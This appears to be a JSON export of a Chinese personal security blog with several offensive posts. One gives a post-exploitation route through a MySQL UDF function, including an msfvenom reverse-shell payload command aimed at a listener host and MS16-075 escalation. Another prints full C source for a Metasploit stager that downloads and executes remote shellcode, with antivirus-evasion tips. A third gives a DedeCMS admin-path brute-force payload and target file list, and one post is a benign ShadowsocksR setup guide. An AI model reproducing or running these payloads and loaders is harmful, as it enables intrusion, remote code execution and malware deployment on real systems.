{"meta":{"title":"Life's blog","subtitle":"","description":"","author":"Life","url":"http://life-time.me"},"pages":[{"title":"","date":"2016-05-24T05:45:13.000Z","updated":"2019-12-14T08:49:15.753Z","comments":false,"path":"about/index.html","permalink":"http://life-time.me/about/index.html","excerpt":"","text":"Web Dog Email:YWRtaW5AbGlmZS10aW1lLm1l"},{"title":"友链","date":"2017-11-12T12:29:21.000Z","updated":"2019-12-13T09:46:38.713Z","comments":true,"path":"link/index.html","permalink":"http://life-time.me/link/index.html","excerpt":"","text":"Fire ant Bing"},{"title":"Tags","date":"2019-12-13T09:34:06.548Z","updated":"2019-12-13T09:33:06.000Z","comments":true,"path":"tags/index.html","permalink":"http://life-time.me/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"udf之sys_bineval","slug":"mysql_udf_sys_bineval","date":"2019-05-21T13:33:51.000Z","updated":"2019-12-13T10:02:55.325Z","comments":true,"path":"2019/05/21/mysql_udf_sys_bineval/","link":"","permalink":"http://life-time.me/2019/05/21/mysql_udf_sys_bineval/","excerpt":"","text":"0x01拿到shell，先摸清环境1win03+iis6+apache+php+mysql 查看被禁用函数1System,exec,passthru 尝试使用未被禁用函数以及调用com，asp等皆无法执行命令 0x02从某个盘的数据库备份文件翻到mysql的root密码，经过尝试发现被降权了，不过能导出udf，进而尝试创建函数执行命令，在使用sys_exec,sys_eval执行命令的时候………mysql炸了，没错，炸了，执行一次炸一次，而且并未成功执行命令目光转向开放端口12803306 将root开启外连，使用sqlmap -d 进行连接，os-shell尝试执行命令，依然爆炸，将sqlmap的udf丢进winhex查看函数列表，发现有个函数(sys_bineval)可以进行内存加载shellcode，随即定位到sqlmap的os-pwn功能，使用这个功能的时候，首先尝试了几次未成功反弹shell，经过本地测试和实战测试对比并使用 -v 3进行debug，发现实战中os-pwn反弹shell的时候并未调用sys_bineval执行shellcode，本地测试也是偶尔可行(垃圾sqlmap) 0x03本地测试debug拿到payload，进行手工构造payload进行反弹shell1msfvenom -p windows/meterpreter/reverse_http EXITFUNC=thread LPORT=8080 LHOST=172.16.229.139 -a x86 -e x86/alpha_mixed -f raw BufferRegister=EAX &gt; test ;cat test |xxd -c 9999 -ps 反弹shell1Select sys_bineval(0x填这); 0x04Ms16-075 getsystem","categories":[],"tags":[{"name":"mysql udf","slug":"mysql-udf","permalink":"http://life-time.me/tags/mysql-udf/"}]},{"title":"custom loader","slug":"custom-loader","date":"2019-02-03T10:41:39.000Z","updated":"2019-12-13T09:44:36.404Z","comments":true,"path":"2019/02/03/custom-loader/","link":"","permalink":"http://life-time.me/2019/02/03/custom-loader/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273来自：https://github.com/peacand/msf-av-escape/blob/master/reverse_https/main_https.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;windows.h&gt;#include &lt;wininet.h&gt;#define HTTP_OPEN_FLAGS 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000/* ;0x80000000 | ; INTERNET_FLAG_RELOAD ;0x04000000 | ; INTERNET_NO_CACHE_WRITE ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT ;0x00000200 | ; INTERNET_FLAG_NO_UI ;0x00800000 | ; INTERNET_FLAG_SECURE ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID ;0x00001000 ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID*/#define OPTIONS_SECURITY_FLAGS 0x00003380 /* ;0x00002000 | ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID ;0x00001000 | ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID ;0x00000200 | ; SECURITY_FLAG_IGNORE_WRONG_USAGE ;0x00000100 | ; SECURITY_FLAG_IGNORE_UNKNOWN_CA ;0x00000080 ; SECURITY_FLAG_IGNORE_REVOCATION*/int main(int argc, char * argv[]) &#123; char * stage; void(*stage_main)(); HINTERNET hInternet; HINTERNET hHttpSession; HINTERNET hHttpRequest; int httpflags = OPTIONS_SECURITY_FLAGS; int recv_tmp = 0, recv_tot = 0; char *stage_index = NULL; /* We dont want the console prompt at screen */ FreeConsole(); /* Even it its SSL encrypted, lets set a User Agent, looks better :-) */ hInternet = InternetOpen(&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)&quot;, 0, NULL, NULL, 0); hHttpSession = InternetConnect(hInternet, argv[1], atoi(argv[2]), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); /* URL format is *important*, don&apos;t change it ! It tells what kind of payload (Native, Python, Java ..) is going to be injected afterwords */ hHttpRequest = HttpOpenRequest(hHttpSession, &quot;GET&quot;, &quot;/1f7MA&quot;, &quot;HTTP/1.1&quot;, NULL, NULL, HTTP_OPEN_FLAGS, 0); /* Set SSL options to the HTTP request */ InternetSetOption(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &amp;httpflags, 4); HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0); /* We got the payload, lets allocate a big chunk of memory in RWX to put the whole thing in */ stage = VirtualAlloc(0, 0x00400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE); /* Read the payload from the previous http request and put it in our buffer */ recv_tmp = 1; recv_tot = 0; stage_index = stage; while (recv_tmp &gt; 0) &#123; InternetReadFile(hHttpRequest, stage_index, 8192, (PDWORD)&amp;recv_tmp); recv_tot += recv_tmp; stage_index += recv_tmp; &#125; /* Just jump at the beginning of the buffer */ stage_main = (void(*)())stage; stage_main(); /* We dont have to care about it, but anyway .. */ InternetCloseHandle(hHttpSession); InternetCloseHandle(hInternet); return 0;&#125; 自行编译Usage：xxoo.exe ip port 什么，你说过不了杀毒？ 自己动手做咯，又不难～","categories":[],"tags":[{"name":"loader","slug":"loader","permalink":"http://life-time.me/tags/loader/"}]},{"title":"wmiexec","slug":"wmiexec","date":"2018-09-16T11:27:59.000Z","updated":"2019-12-13T09:33:07.000Z","comments":true,"path":"2018/09/16/wmiexec/","link":"","permalink":"http://life-time.me/2018/09/16/wmiexec/","excerpt":"","text":"笔记…..最近搞内网的时候，特别需要用到这类的东西psexec又会留下痕迹，还是用wmiexec吧….地址:https://www.t00ls.net/viewthread.php?tid=21167= =混淆一下即可免杀～附上在线混淆地址:https://isvbscriptdead.com/vbs-obfuscator/","categories":[],"tags":[]},{"title":"SSR","slug":"ssr","date":"2018-04-18T03:15:57.000Z","updated":"2019-12-13T09:44:19.516Z","comments":true,"path":"2018/04/18/ssr/","link":"","permalink":"http://life-time.me/2018/04/18/ssr/","excerpt":"","text":"单用户的~ GitHub 地址 作者已经删除了该项目，下面这个是其他人fork的https://github.com/shadowsocksrr/shadowsocksr.git 部署先git下来 git clone https://github.com/shadowsocksrr/shadowsocksr.git 安装python以及pipubuntu: apt-get install python-gevent python-pip python-m2crypto python-wheel python-setuptools cd 到目录 cd shadowsocksr 初始化一下 ./initcfg.sh 修改配置文件(端口，密码，加密等) vim user-config.json 12345678910111213141516171819202122 &quot;server&quot;: &quot;0.0.0.0&quot;, &quot;server_ipv6&quot;: &quot;::&quot;, &quot;server_port&quot;: 8388, //自定义端口 &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;: 1080, &quot;password&quot;: &quot;m&quot;, //密码 &quot;timeout&quot;: 120, &quot;udp_timeout&quot;: 60, &quot;method&quot;: &quot;aes-128-ctr&quot;, //加密 &quot;protocol&quot;: &quot;auth_aes128_md5&quot;, //协议 &quot;protocol_param&quot;: &quot;&quot;, &quot;obfs&quot;: &quot;tls1.2_ticket_auth_compatible&quot;, //混淆，这里建议改成tls1.2_ticket_auth &quot;obfs_param&quot;: &quot;&quot;, &quot;speed_limit_per_con&quot;: 0, &quot;speed_limit_per_user&quot;: 0, &quot;dns_ipv6&quot;: false, &quot;connect_verbose_info&quot;: 0, &quot;redirect&quot;: &quot;&quot;, &quot;fast_open&quot;: false&#125; 改完保存，cd到shadowsocks chmod +x *.sh //给权限 启动服务： ./logrun.sh //后台运行如果要调试就python server.py，关闭终端就会断开 停止服务： ./stop.sh 查看日志： ./tail.sh","categories":[],"tags":[{"name":"小飞机","slug":"小飞机","permalink":"http://life-time.me/tags/小飞机/"}]},{"title":"dede通配符爆破后台~","slug":"dede通配符爆破后台","date":"2018-03-03T04:37:18.000Z","updated":"2019-12-13T09:33:07.000Z","comments":true,"path":"2018/03/03/dede通配符爆破后台/","link":"","permalink":"http://life-time.me/2018/03/03/dede通配符爆破后台/","excerpt":"","text":"emmmmmm，再也不用担心找不到dede的后台了~~(只支持win) exp(php):https://xianzhi.aliyun.com/forum/topic/2064 exp(python3):https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/ 这个地方要说一下，包含了common.inc.php的都可以跑….. 预防tags.php和index.php不能跑，这里我总结了一下可以利用的php: 这里二级目录爆破的话，exp的语句需要改一下 1dopost=save&amp;_FILES[b4dboy][tmp_name]=../$v$vv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif /install/module_autos.php /m/index.php /m/list.php /m/view.php /member/config.php /plus/ad_js.php /plus/advancedsearch.php /plus/arcmulti.php /plus/bookfeedback.php /plus/bookfeedback_js.php /plus/car.php /plus/carbuyaction.php /plus/comments_frame.php /plus/count.php /plus/digg_ajax.php /plus/digg_frame.php /plus/disdls.php /plus/diy.php /plus/download.php /plus/erraddsave.php /plus/feedback.php /plus/feedback_ajax.php /plus/feedback_js.php /plus/flink.php /plus/flink_add.php /plus/freelist.php /plus/guestbook.php /plus/heightsearch.php /plus/list.php /plus/mytag_js.php /plus/posttocar.php /plus/qrcode.php /plus/recommend.php /plus/rss.php /plus/search.php /plus/showphoto.php /plus/stow.php /plus/task.php /plus/view.php /plus/vote.php","categories":[],"tags":[{"name":"通配符","slug":"通配符","permalink":"http://life-time.me/tags/通配符/"}]}]}